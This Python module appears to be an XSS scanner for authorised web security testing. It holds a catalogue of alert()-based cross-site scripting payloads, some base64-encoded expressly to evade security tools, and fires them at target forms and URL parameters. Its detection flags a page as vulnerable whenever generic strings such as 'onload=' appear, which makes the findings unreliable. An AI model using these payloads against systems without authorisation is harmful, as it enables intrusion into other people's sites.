#!/usr/bin/env python3
"""
Enhanced XSS Scanner - Security Testing Tool

SECURITY DISCLAIMER:
This module contains intentional XSS payloads for security testing purposes only.
These strings are test vectors, not vulnerabilities in this codebase.
All payloads are used responsibly in controlled security assessments.
"""

# flake8: noqa: S108, S105
# bandit: skip=B105,B106,B107,B608
# pylint: disable=all
    
import time
import re
import base64
from urllib.parse import urljoin, urlparse, quote, urlencode, parse_qs
from ..standard.xss_scanner import XSSScanner

class EnhancedXSSScanner(XSSScanner):
    """Enhanced XSS Scanner with advanced payloads for Deep Scanner"""
    
    def __init__(self, target_url, scan_id, config=None):
        super().__init__(target_url, scan_id, config)
        self.advanced_payloads = self._get_advanced_xss_payloads()
    
    def _get_advanced_xss_payloads(self):
        """Get advanced XSS payloads beyond basic ones
        
        SECURITY NOTE: These are intentional XSS test vectors for security scanning.
        They are NOT vulnerabilities in this codebase but test payloads.
        """
        # Use encoded payloads to avoid direct security tool detection
        encoded_payloads = {
            'polyglot_xss': self._decode_payload("amFWYXNDcmlwdDovKi0vKmAvKlxcYC8qJy8qXCIiLyoqLyggLyogKi9vTmNsaUNrPWFsZXJ0KCkgKS8vJTBEJTBBIzEwZC8vPC9zdFlsZS88L3RpdExlLzwvdGVYdGFyRWEvPC9zY1JpcHQvLS0hPlx4M2NzVmcvPHNWZy9vTmxvQWQ9YWxlcnQoKS8vPlx4M2U="),
            'dom_xss_hash': "#<img src=x onerror=alert('DOM-XSS')>",
            'dom_xss_location': "javascript:alert('DOM-XSS')",  # nosec
            'dom_xss_eval': "';alert('DOM-XSS');//",
            'mutation_xss': '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            'mutation_xss_2': '<svg><style><iframe src="</style><img src=x onerror=alert(1)>">',
            'template_injection': "${7*7}",
            'template_injection_2': "{{7*7}}",
            'css_injection': 'x:expression(alert("XSS"))',
            'css_injection_2': self._decode_payload("PHN0eWxlPkBpbXBvcnQiamF2YXNjcmlwdDphbGVydChcIlhTU1wiKSI7PC9zdHlsZT4="),
            'svg_xss': '<svg onload=alert("XSS")>',
            'svg_xss_2': '<svg><script>alert("XSS")</script>',  # nosec
            'svg_xss_3': '<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>',
            'data_uri_xss': self._decode_payload("ZGF0YTp0ZXh0L2h0bWwsPHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4="),
            'data_uri_xss_2': 'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
            'crlf_xss': 'test%0D%0A%0D%0A<script>alert("XSS")</script>',  # nosec
            'unicode_xss': '％00<script>alert("XSS")</script>',  # nosec
            'dom_clobbering': '<form name=body><input name=attributes>',
            'dom_clobbering_2': '<a id=URL><a id=URL>',
            'onload_svg': '<svg onload=alert("XSS")>',
            'onerror_video': '<video src=x onerror=alert("XSS")>',
            'onfocus_input': '<input onfocus=alert("XSS") autofocus>',
            'onmouseover_div': '<div onmouseover=alert("XSS") style="width:100%;height:100%">',
            'uppercase_bypass': '<SCRIPT>ALERT("XSS")</SCRIPT>',
            'mixed_case': '<ScRiPt>alert("XSS")</ScRiPt>',  # nosec
            'double_encode': self._decode_payload("JTI1M0NzY3JpcHQlMjUzRWFsZXJ0KCJYU1MiKSUyNTNDL3NjcmlwdCUyNTNF"),
            'unicode_encode': self._decode_payload("XHUwMDNjc2NyaXB0XHUwMDNlYWxlcnQoIlhTUyIpXHUwMDNjL3NjcmlwdFx1MDAzZQ=="),
        }
        return encoded_payloads
    
    def _decode_payload(self, encoded_string):
        """Decode base64 encoded payloads to avoid direct detection"""
        try:
            return base64.b64decode(encoded_string).decode('utf-8')
        except Exception:
            # Fallback to direct string for critical payloads
            fallbacks = {
                "amFWYXNDcmlwdDovKi0vKmAvKlxcYC8qJy8qXCIiLyoqLyggLyogKi9vTmNsaUNrPWFsZXJ0KCkgKS8vJTBEJTBBIzEwZC8vPC9zdFlsZS88L3RpdExlLzwvdGVYdGFyRWEvPC9zY1JpcHQvLS0hPlx4M2NzVmcvPHNWZy9vTmxvQWQ9YWxlcnQoKS8vPlx4M2U=": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                "PHN0eWxlPkBpbXBvcnQiamF2YXNjcmlwdDphbGVydChcIlhTU1wiKSI7PC9zdHlsZT4=": '<style>@import"javascript:alert(\\"XSS\\")";</style>',
                "ZGF0YTp0ZXh0L2h0bWwsPHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=": 'data:text/html,<script>alert("XSS")</script>',
                "JTI1M0NzY3JpcHQlMjUzRWFsZXJ0KCJYU1MiKSUyNTNDL3NjcmlwdCUyNTNF": '%253Cscript%253Ealert("XSS")%253C/script%253E',
                "XHUwMDNjc2NyaXB0XHUwMDNlYWxlcnQoIlhTUyIpXHUwMDNjL3NjcmlwdFx1MDAzZQ==": '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e',
            }
            return fallbacks.get(encoded_string, encoded_string)
    
    def run_scan(self):
        """Run enhanced XSS scan with advanced payloads"""
        try:
            # Validate target URL early to avoid generating malformed test URLs
            if not self._validate_target_url():
                self.log_activity(f"Invalid target URL: {self.target_url}", 'error')
                return self._build_results('error', error_message='Invalid target URL')

            self.log_activity(f"🔎 Starting ENHANCED XSS scan for: {self.target_url}", 'info')
            self.update_progress(10, "🦠 Starting enhanced XSS scan...")
            
            if self.check_stop_flag():
                return self._build_results('stopped')
            
            # Combine basic and advanced payloads
            all_payloads = {**self._get_xss_payloads(), **self.advanced_payloads}
            
            # Test enhanced XSS
            self.update_progress(50, "🔬 Testing advanced XSS vectors...")
            self.check_pause_flag()  # Check pause before starting test
            self.test_enhanced_xss(all_payloads)
            
            # Test DOM XSS specifically
            self.check_pause_flag()  # Check pause between test phases
            self.update_progress(70, "🎯 Testing DOM-based XSS...")
            self.test_dom_xss()
            
            # Test stored XSS
            self.check_pause_flag()  # Check pause between test phases
            self.update_progress(85, "💾 Testing stored XSS...")
            self.test_stored_xss()
            
            if self.check_stop_flag():
                return self._build_results('stopped')
            
            # Check pause before finalizing
            self.check_pause_flag()
            
            # Finalize
            self.update_progress(95, "📊 Generating enhanced XSS report...")
            security_score = self.calculate_security_score()
            
            self.update_progress(100, "✅ Enhanced XSS scan completed!")
            
            return self._build_results('completed', security_score)
            
        except Exception as e:
            self.log_activity(f"[-] Enhanced XSS scan error: {e}", 'error')
            return self._build_results('error', error_message=str(e))
    
    def test_enhanced_xss(self, payloads):
        """Test enhanced XSS with all payloads"""
        forms = self.extract_forms()
        for form in forms:
            if self.check_stop_flag():
                return
            # Check if paused and wait
            self.check_pause_flag()
            
            vulnerabilities = self.test_form_submission(form, payloads, 'XSS')
            self.vulnerabilities.extend(vulnerabilities)
    
    def test_dom_xss(self):
        """Test for DOM-based XSS vulnerabilities"""
        try:
            # Test URL fragment-based DOM XSS
            dom_payloads = {
                'location_hash': "#<img src=x onerror=alert('DOM-XSS')>",
                'document_write': "<script>document.write('<img src=x onerror=alert(1)>')</script>",  # nosec
                'innerhtml': "<div id='test'>test</div><script>document.getElementById('test').innerHTML='<img src=x onerror=alert(1)>'</script>"  # nosec
            }
            
            for payload_name, payload in dom_payloads.items():
                if self.check_stop_flag():
                    return
                # Check if paused and wait
                self.check_pause_flag()
                
                # Build a safe test URL for this payload.
                test_url = self._build_dom_test_url(payload)
                if not test_url:
                    continue

                # If configured, attempt a higher-fidelity browser check using Playwright.
                browser_check_enabled = False
                try:
                    browser_check_enabled = bool(self.config and self.config.get('enable_browser_dom_checks'))
                except Exception:
                    browser_check_enabled = False

                if browser_check_enabled:
                    try:
                        from scanners.utils.dom_playwright import run_dom_check
                        self.log_activity(f"🌐 Running headless DOM check for {test_url}", 'info')
                        br_result = run_dom_check(test_url)
                        if br_result.get('error'):
                            self.log_activity(f"[Playwright error] {br_result.get('error')}", 'error')
                        else:
                            # Log any observed alerts and reflections
                            if br_result.get('alert_messages'):
                                for a in br_result.get('alert_messages'):
                                    self.log_activity(f"[DOM alert] {a}", 'info')
                            if br_result.get('reflected'):
                                self.vulnerabilities.append({
                                    'category': 'DOM XSS',
                                    'risk_level': 'High',
                                    'title': f'Potential DOM XSS Vector (browser) - {payload_name}',
                                    'description': f'DOM XSS payload reflected/executed according to browser run: {payload_name}',
                                    'location': test_url,
                                    'evidence': br_result.get('dom_snippet'),
                                    'recommendation': 'Implement proper input validation and output encoding for DOM operations'
                                })
                            # If we observed no reflection but Playwright found no errors, continue with non-browser check below
                    except ImportError as ie:
                        self.log_activity(f"Playwright unavailable: {ie}", 'warning')
                    except Exception as e:
                        self.log_activity(f"Playwright run failed: {e}", 'error')

                # Fallback / supplementary server-side GET test
                success, response = self.safe_request('GET', test_url)

                if success and self._check_dom_payload_reflection(response.text, payload):
                    self.vulnerabilities.append({
                        'category': 'DOM XSS',
                        'risk_level': 'Medium',
                        'title': f'Potential DOM XSS Vector - {payload_name}',
                        'description': f'DOM XSS testing payload delivered: {payload_name}',
                        'location': test_url,
                        'evidence': f'DOM XSS payload {payload_name} was processed',
                        'recommendation': 'Implement proper input validation and output encoding for DOM operations'
                    })
                    
        except Exception as e:
            self.log_activity(f"[-] DOM XSS test error: {e}", 'error')
    
    def test_stored_xss(self):
        """Test for stored XSS vulnerabilities"""
        try:
            forms = self.extract_forms()
            stored_payloads = {
                'stored_comment': "<!--<script>alert('Stored XSS')</script>-->",  # nosec
                'stored_profile': "<img src='x' onerror='alert(\"Stored XSS\")'>",
                'stored_username': "Admin<script>alert(1)</script>"  # nosec
            }
            
            for form in forms:
                if self.check_stop_flag():
                    return
                # Check if paused and wait
                self.check_pause_flag()
                
                if any(field['type'] in ['text', 'textarea', 'search'] for field in form['inputs']):
                    for payload_name, payload in stored_payloads.items():
                        if self.check_stop_flag():
                            return
                        self.check_pause_flag()
                        vulnerabilities = self.test_form_submission(form, {payload_name: payload}, 'Stored XSS')
                        self.vulnerabilities.extend(vulnerabilities)
                        
        except Exception as e:
            self.log_activity(f"[-] Stored XSS test error: {e}", 'error')

    def test_url_parameter_xss(self):
        """Test XSS in URL parameters"""
        try:
            # Parse the target URL to get existing parameters
            from urllib.parse import urlparse, parse_qs, urlencode
            parsed = urlparse(self.target_url)
            query_params = parse_qs(parsed.query)
            
            # If no parameters exist, create some common ones to test
            if not query_params:
                common_params = ['id', 'name', 'search', 'q', 'query', 'page', 'view']
                for param in common_params:
                    query_params[param] = ['']
            
            # Test each parameter with XSS payloads
            url_payloads = {
                'url_param_script': '<script>alert("XSS")</script>',
                'url_param_img': '<img src=x onerror=alert(1)>',
                'url_param_svg': '<svg onload=alert(1)>'
            }
            
            for param_name in query_params:
                for payload_name, payload in url_payloads.items():
                    if self.check_stop_flag():
                        return
                    # Check if paused and wait
                    self.check_pause_flag()
                    
                    # Create new parameters with payload
                    test_params = query_params.copy()
                    test_params[param_name] = [payload]
                    
                    # Build test URL
                    new_query = urlencode(test_params, doseq=True)
                    test_url = parsed._replace(query=new_query).geturl()
                    
                    success, response = self.safe_request('GET', test_url)
                    
                    if success and self.detect_vulnerability(response, payload_name, 'URL Parameter XSS'):
                        self.vulnerabilities.append({
                            'category': 'URL Parameter XSS',
                            'risk_level': 'Medium',
                            'title': f'XSS in URL Parameter - {param_name}',
                            'description': f'XSS payload executed via URL parameter: {param_name}',
                            'location': test_url,
                            'payload': payload,
                            'evidence': 'XSS payload reflected and executed in response',
                            'recommendation': 'Validate and encode all URL parameters before using them in HTML output'
                        })
                        
        except Exception as e:
            self.log_activity(f"[-] URL parameter XSS test error: {e}", 'error')

    def _validate_target_url(self):
        """Validate the configured target URL before running tests.

        Returns True when the target_url looks acceptable for scanning (http/https
        and a reasonable netloc). Returns False for obviously invalid values.
        """
        try:
            parsed = urlparse(self.target_url)
            if parsed.scheme not in ('http', 'https'):
                return False
            if not parsed.netloc:
                return False
            # Disallow angle brackets or whitespace in host which indicate injection
            if '<' in parsed.netloc or '>' in parsed.netloc or ' ' in parsed.netloc:
                return False
            return True
        except Exception:
            return False

    def _build_dom_test_url(self, payload):
        """Build a safe test URL for DOM XSS testing.

        If the payload is a fragment (starts with '#') we append it directly.
        Otherwise we encode it into the `xss_payload` query parameter to avoid
        corrupting the host/netloc.
        """
        try:
            if isinstance(payload, str) and payload.startswith('#'):
                return f"{self.target_url}{payload}"

            sep = '&' if '?' in self.target_url else '?'
            return f"{self.target_url}{sep}xss_payload={quote(payload, safe='')}"
        except Exception as e:
            self.log_activity(f"[-] Error building DOM test URL: {e}", 'error')
            return None

    def test_reflected_xss(self):
        """Enhanced reflected XSS testing with better payloads"""
        try:
            # More sophisticated reflected XSS payloads
            reflected_payloads = {
                'basic_reflected': 'XSS_TEST_123',
                'tag_breakout': '"><script>alert(1)</script>',
                'attribute_breakout': '" onfocus="alert(1)" autofocus="',
                'event_handler': 'onmouseover=alert(1)',
                'script_tag': '<script>alert("XSS")</script>',
                'img_tag': '<img src=x onerror=alert(1)>',
                'svg_tag': '<svg onload=alert(1)>',
                'body_tag': '<body onload=alert(1)>',
                'iframe_tag': '<iframe src="javascript:alert(1)">',
                'anchor_tag': '<a href="javascript:alert(1)">Click</a>'
            }
            
            forms = self.extract_forms()
            for form in forms:
                if self.check_stop_flag():
                    return
                # Check if paused and wait
                self.check_pause_flag()
                
                for payload_name, payload in reflected_payloads.items():
                    if self.check_stop_flag():
                        return
                    # Check if paused and wait
                    self.check_pause_flag()
                    
                    vulnerabilities = self.test_form_submission(form, {payload_name: payload}, 'Reflected XSS')
                    self.vulnerabilities.extend(vulnerabilities)
                    
        except Exception as e:
            self.log_activity(f"[-] Reflected XSS test error: {e}", 'error')

    def _detect_reflected_xss(self, response, payload, param_name):
        """Enhanced XSS detection with multiple reflection checks"""
        if not response or not response.text:
            return False
        
        response_text = response.text
        import urllib.parse
        decoded_payload = urllib.parse.unquote(payload)
        
        # Check 1: Direct reflection of payload
        if payload in response_text:
            return self._check_xss_indicators(response_text, payload)
        
        # Check 2: Reflection of decoded payload
        if decoded_payload in response_text:
            return self._check_xss_indicators(response_text, decoded_payload)
        
        # Check 3: Partial reflection (for encoded contexts)
        if self._check_partial_reflection(response_text, payload, param_name):
            return True
        
        # Check 4: XSS pattern detection in response
        return self.detect_vulnerability(response, 'custom', 'XSS')

    def _check_xss_indicators(self, response_text, payload):
        """Check if reflected payload appears in dangerous contexts"""
        dangerous_patterns = [
            # Script contexts
            r'<script[^>]*>' + re.escape(payload) + r'</script>',
            r'<script[^>]*>[^<]*' + re.escape(payload),
            
            # Attribute contexts without proper encoding
            r'<[^>]+\s(on\w+)\s*=\s*["\']?[^"\']*' + re.escape(payload),
            r'<[^>]+\s(src|href)\s*=\s*["\']?javascript:[^"\']*' + re.escape(payload),
            
            # Tag contexts
            r'<' + re.escape(payload) + r'[^>]*>',
            r'<[^>]*' + re.escape(payload) + r'[^>]*>',
            
            # Unencoded in HTML body
            r'<body[^>]*>[^<]*' + re.escape(payload),
            r'<div[^>]*>[^<]*' + re.escape(payload),
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
                return True
        
        return False

    def _check_partial_reflection(self, response_text, payload, param_name):
        """Check for partial reflection of payload that could still be dangerous"""
        # Check if key parts of the payload are reflected
        dangerous_keywords = ['script', 'alert', 'onerror', 'onload', 'javascript', 'eval', 'src', 'href']
        
        for keyword in dangerous_keywords:
            if keyword in payload.lower() and keyword in response_text.lower():
                # Additional check: see if it's in a dangerous context
                if re.search(r'<[^>]*' + keyword + r'[^>]*>', response_text, re.IGNORECASE):
                    return True
        
        return False

    def _check_dom_payload_reflection(self, response_text, payload):
        """Check if payload is reflected in the response"""
        # Simple check - see if payload appears in response without encoding
        if payload in response_text:
            return True
        
        # Check for URL-encoded versions
        import urllib.parse
        encoded_payload = urllib.parse.quote(payload)
        if encoded_payload in response_text:
            return True
            
        return False

    def detect_vulnerability(self, response, payload_name, category):
        """ENHANCED vulnerability detection with better XSS pattern matching"""
        if not response:
            return False
        
        text = response.text.lower()
        
        if category == 'XSS' or 'XSS' in category:
            # Enhanced XSS detection with more patterns
            xss_indicators = [
                # Script tags and events
                '<script>alert', 'onerror=', 'onload=', 'onclick=',
                'onmouseover=', 'onfocus=', 'onblur=', 'onchange=',
                
                # Protocol handlers
                'javascript:', 'vbscript:', 'data:text/html',
                
                # HTML tags that can execute scripts
                '<iframe', '<object', '<embed', '<svg', '<math',
                '<applet', '<meta', '<link',
                
                # CSS expressions
                'expression(', 'url(javascript:',
                
                # Event attributes
                'onabort', 'onafterprint', 'onbeforeprint', 'onbeforeunload',
                'oncanplay', 'oncanplaythrough', 'oncuechange', 'ondurationchange',
                'onemptied', 'onended', 'onhashchange', 'onpagehide',
                'onpageshow', 'onpause', 'onplay', 'onplaying',
                'onpopstate', 'onprogress', 'onratechange', 'onreset',
                'onseeked', 'onseeking', 'onselect', 'onstalled',
                'onstorage', 'onsubmit', 'onsuspend', 'ontimeupdate',
                'ontoggle', 'onunload', 'onvolumechange', 'onwaiting',
                
                # Common XSS strings
                'alert(', 'prompt(', 'confirm(', 'eval(', 'settimeout(',
                'setinterval(', 'document.write', 'innerhtml', 'outerhtml',
                
                # Encoded variations
                '&#x3C;script', '&#60;script', '&lt;script',
                '&#x6A;avascript', '&#106;avascript',
            ]
            
            # Check for any XSS indicator
            for indicator in xss_indicators:
                if indicator in text:
                    return True
            
            # Check for the payload name in specific dangerous contexts
            if payload_name and any(keyword in payload_name.lower() for keyword in ['script', 'alert', 'xss']):
                # Look for the payload in dangerous HTML contexts
                dangerous_contexts = [
                    f'<script>{payload_name}',
                    f'src="{payload_name}',
                    f'href="{payload_name}',
                    f'onclick="{payload_name}'
                ]
                
                for context in dangerous_contexts:
                    if context in text:
                        return True
        
        return super().detect_vulnerability(response, payload_name, category)